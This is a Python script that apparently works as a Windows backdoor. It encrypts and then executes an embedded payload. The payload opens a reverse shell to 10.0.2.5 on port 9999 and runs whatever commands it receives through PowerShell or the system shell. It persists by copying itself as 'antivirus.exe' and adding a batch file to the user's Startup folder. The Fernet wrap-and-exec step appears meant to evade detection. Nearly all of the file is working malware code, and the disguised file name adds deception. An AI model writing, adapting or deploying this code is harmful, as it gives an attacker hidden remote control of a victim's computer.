from cryptography.fernet import Fernet
import base64

code = b'''

import subprocess
import socket
import os
import sys
from getpass import getuser
from shutil import copyfile

IP = "10.0.2.5"
PORT = 9999
USERNAME = getuser()

def add_to_startup():
    d = os.environ['USERPROFILE']+"\\WindowsTools"
    os.mkdir(d)
    d = d+"\\"+"antivirus.exe"
    copyfile(os.environ['USERPROFILE']+"\\Downloads\\fun.exe", d)

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USERNAME
    with open(bat_path + '\\' + "WindowsTools.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % d)


def main():
    if sys.platform == "win32":
        powershell = True
        if "antivirus" not in __file__:
            add_to_startup()
    else:
        powershell = False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            s.connect((IP, PORT))
            s.settimeout(30)
#            s.send("[*] Connection Established\n".encode())
            done = False
            try:
                while not done:
                    s.send(str.encode(os.getcwd() + ">"))
                    data = s.recv(1024).decode("UTF-8").strip()
                    if data == "exit":
                        s.send("Goodbye...".encode())
                        s.close()
                        done = True
                    elif data[:2] == "cd":
                        os.chdir(data[3:])
                    elif len(data) > 0:
                        if powershell:
                            proc = subprocess.Popen(f"powershell.exe {data}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        else:
                            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read()
                        output_str = str(stdout_value, "UTF-8")
                        s.send(str.encode("\n" + output_str))
            except Exception as _:
                    continue
    except OSError as _:
        pass
    except KeyboardInterrupt:
        s.close()
        sys.exit()

main()

'''

if __name__ == "__main__":
    key = Fernet.generate_key()
    encryption_type = Fernet(key)
    encrypted_message = encryption_type.encrypt(code)

    decrypted_message = encryption_type.decrypt(encrypted_message)

    exec(decrypted_message)